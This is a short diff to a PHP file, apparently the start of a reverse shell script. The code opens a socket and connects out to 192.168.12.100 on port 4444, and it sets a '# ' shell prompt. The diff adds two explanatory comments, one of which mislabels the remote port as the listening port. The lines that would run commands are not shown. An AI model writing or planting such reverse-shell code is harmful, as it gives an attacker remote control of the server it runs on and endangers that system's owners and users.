@@ -1,6 +1,8 @@
 <?php 
 $socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
+// Socket will be bind to any IP address on port 51234
 socket_bind($socket, '0.0.0.0', 51234);
+// Change the listening port in socket_connect()
 $connection = socket_connect($socket, '192.168.12.100', 4444);
 $output = array();;
 $message = "# ";
